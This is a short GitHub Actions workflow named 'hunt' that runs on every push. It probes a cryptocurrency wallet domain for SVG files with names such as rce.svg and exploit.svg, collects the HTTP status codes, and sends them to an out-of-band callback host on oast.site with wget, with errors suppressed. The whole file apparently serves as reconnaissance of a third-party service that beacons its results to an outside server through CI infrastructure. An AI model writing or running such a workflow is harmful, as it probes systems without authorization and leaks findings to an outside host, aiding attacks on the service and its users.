name: hunt
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: |
          R=""
          for p in rce.svg avif.svg p.svg exploit.svg x.svg og.svg card.svg logo.svg icon.svg avatar.svg; do
            C=$( (curl -s --max-time 6 -o /dev/null -w "%{http_code}" "https://wallet.ring.exchange/$p" || echo e) )
            R="$R$p=$C "
          done
          wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/hunt-$(echo $R | tr ' ' '_' | head -c 55)" || true
        continue-on-error: true
